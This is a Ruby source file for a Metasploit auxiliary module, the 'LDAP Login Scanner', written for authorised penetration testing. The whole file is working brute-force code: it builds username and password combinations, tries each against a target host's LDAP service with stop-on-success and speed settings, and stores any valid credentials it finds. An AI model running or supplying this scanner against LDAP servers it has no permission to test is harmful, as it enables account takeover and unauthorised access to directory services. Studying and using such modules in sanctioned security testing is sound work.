##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ldap'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::LDAP
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Login Scanner',
        'Description' => 'This module attempts to login to the LDAP service.',
        'Author' => [ 'Dean Welch' ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def run_host(ip)
    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD'],
      realm: datastore['DOMAIN']
    )

    scanner = Metasploit::Framework::LoginScanner::LDAP.new(
      host: ip,
      port: rport,
      # proxies: datastore['PROXIES'],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      connection_timeout: datastore['LDAP::ConnectTimeout'].to_i,
      framework: framework,
      framework_module: self
      # ssl: datastore['SSL']
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        store_valid_credential(user: result.credential.public, private: result.credential.private)
        # create_credential_login(credential_data)

        print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}'"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end
end
